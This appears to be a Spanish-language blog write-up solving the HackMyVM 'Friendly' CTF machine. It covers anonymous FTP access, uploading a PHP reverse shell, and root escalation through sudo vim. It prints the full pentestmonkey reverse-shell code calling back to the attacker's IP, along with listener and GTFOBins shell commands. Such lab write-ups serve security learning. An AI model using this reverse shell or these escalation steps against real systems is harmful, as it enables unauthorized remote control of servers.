---
title: CTF-HackMyVM-Friendly
published: true
---

## WriteUps maquina Friendly de HackMyVM

---
tags:
  - CTF
  - estado/completado
  - plataforma: [HackMyVM]
  - dificultad: Fácil
  - autor: [RiJaba1]

# Datos

[!INFO] Friendly
  -  Máquina Friendly, creada por [[RiJaba1]] para la plataforma [[HackMyVM]] siendo la primera maquina virtual de la saga Friendly para principiantes, con sistema operativo Linux y fecha de lanzamiento: 24 de marzo del 2023, hasta el momento 212 usuarios enviaron la flag de root y 213 la flag de user.

  - **Más información:** [Machine Friendly](https://hackmyvm.eu/machines/machine.php?vm=Friendly)
  
  - **Descargar:** [friendly.zip](https://downloads.hackmyvm.eu/friendly.zip)


# Pentesting

Para esta maquina no es necesario que realice un escaneo de la red, puesto que la misma me esta mostrando la dirección ip local que esta tomando. 

Así que procedo a realizar un escaneo completo con nmap, donde le indico que me muestre todos los puertos, los 65535 que existe (-p-), adicional que solo me muestre los puertos abiertos (--open), que ejecute los scripts comunes (-sC), se envía paquetes sin para verificar si los puertos están abiertos o cerrados (-sS), y que haga la detención de servicios corriendo en los puertos identificados (-sV), se establece que la velocidad sea a unos 5000 paquetes por segundos, que no realice la detención DNS (-n), el modo verbose que sea muy alto (-vvv), que no realice el descubrimiento de hosts pues se que la maquina esta encendida (-Pn), le indico la dirección IP y por ultimo que guarde todo en el directorio actual con el nombre: friendly.

`nmap -p- --open -sC -sS -sV --min-rate=5000 -n -vvv -Pn 192.168.1.10 -oN friendly`

El resultado del escaneo ya me muestra cosas interesantes:

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
|_-rw-r--r--   1 ftp      nogroup      2995 Mar 17 15:22 pwned-friendly.php
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.54 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:35:DD:97 (Oracle VirtualBox virtual NIC)
```

El escaneo me muestra que existen 2 puertos abiertos, el **puerto 21 con servicio ProFTPD y puerto 80 con servicio Apache httpd 2.4.54**, algo que resalta es que se puede ingresar como usuario *Anonymous* al servicio FTP, y allí se puede ver 2 archivos: *index.html* y *pwned-friendly.php* 

Me voy a descargar estos archivos en mi maquina local para ver contenido, para ello, me conecto por ftp con el comando: `ftp 192.168.1.10` me solicita el nombre de usuario, así que coloco: `anonymous` y en el campo contraseña procedo a dejarlo vació e ingreso de forma correcta, estando dentro, hago un `dir`para que mue muestre todos los archivos de ese directorio, luego para descargarme los archivos lo hago con `get index.html`

![ctfFTPAnonymousFriendly.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/ctfFTPAnonymousFriendly.png)


Al ingresar al puerto 80 de la maquina, solo veo un `Apache2 Debian Default Page` que es la pagina por defecto al instalar apache, chequeando el archivo PHP descargado desde el servicio ftp, me parece una reverse shell, lo voy a modificar de forma local y subirlo al servidor por ftp nuevamente ya modificado.

![CTFpwned-friendlyPHP.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/CTFpwned-friendlyPHP.png)

Luego de modificar el archivo: `pwned-friendly.php` añadiendo mi dirección IP local y subirlo el archivo modificado por la misma sesión de FTP, me he colocado a la escucha con netcat `nc -lnvp 443` y de esta forma logre obtener una conexión remota a la maquina, sin embargo esta conexión no es estable, se desconecta rápidamente, así que procedo más bien a utilizar, la bien conocida `PHP PentestMonkey`, modificando todo el contenido de `pwned-friendly.php` 

```php

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.1.8';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Y de esta forma consigo obtener una conexión remota al equipo, con una shell mucho mas estable y sin tener que realizar tratamiento a la tty.

![CTFriendlyNC.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/CTFriendlyNC.png)

Estando aquí, me muevo al directorio `/home` y veo que existe el usuario `RiJaba1` y cuando realizo un `ls` a su directorio, obtengo la primera flags: `users.txt`, estando allí navego entre los directorios existente en busca de pista, y obtengo algo interesante:

```
cd /home/RiJaba1/Private
cat targets.txt
U2hlbGxEcmVkZAp4ZXJvc2VjCnNNTApib3lyYXMyMDAK
```

Sin embargo, esta no es la flags de root, para obtenerla necesito elevar privilegios, por lo tanto lo primero que intento es un: `sudo -l` y me encuentro el siguiente binario `/usr/bin/vim` que puede iniciarse con sudo sin contraseña.

![FriendlySudoLCTF.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/FriendlySudoLCTF.png)

Así que me voy a buscar en GTFOBins como poder elevar privilegios con sudo usando este binario y encuentro lo siguiente:

![SudoVimGTFOBinsFriendly.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/SudoVimGTFOBinsFriendly.png)

Ejecuto el primer comando `sudo vim -c ':!/bin/sh'` y con eso logro obtener el acceso de root, para este si tengo que realizar un tratamiento de la tty, y ya con este acceso como root, me pensaba que tenia la maquina lista, que solo era hacer un `cat` a la carpeta home de root y consultar la flag `root.txt` pero no fue así, resulta que Ribaja1, quiso ponerla un poco más difícil y coloco la flag en otro lado.

![CTFROOTFriendly.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/CTFROOTFriendly.png)

Aunque también dio la solución, indica en su pista, que se debe usar `find` para encontrar la flags y cuando hago eso, obtengo la siguiente ruta: `/var/log/apache2/root.txt` que al consultar este archivo, obtengo la flags de root y con eso queda culminada la maquina.

# Bandera(s)

[!FLAG] 
  - `User-flag{VGUgdG9jYSBvYnRlbmVyIGEgdGkgbGEgZmxhZw==}`
  - `Root-flag{QXF1aSBubyB2YXMgYSBlbmNvbnRyYXIgbmFkYQ==}`

# Comandos

[!IMPORTANT] Resumen de comandos utilizados
  - `map -p- --open -sC -sS -sV --min-rate=5000 -n -vvv -Pn 192.168.1.10 -oN friendly`
  - `ftp 192.168.1.10`
  - `get index.html`
  - `get pwned-friendly.php`
  - `nano pwned-friendly.php`
  - `sudo -l`
  - `sudo vim -c ':!/bin/sh'`
  - `cat /var/log/apache2/root.txt`


```
¡Que la fuerza del hacking ético nos acompañe! :)
```

|   |
|:--|
|   |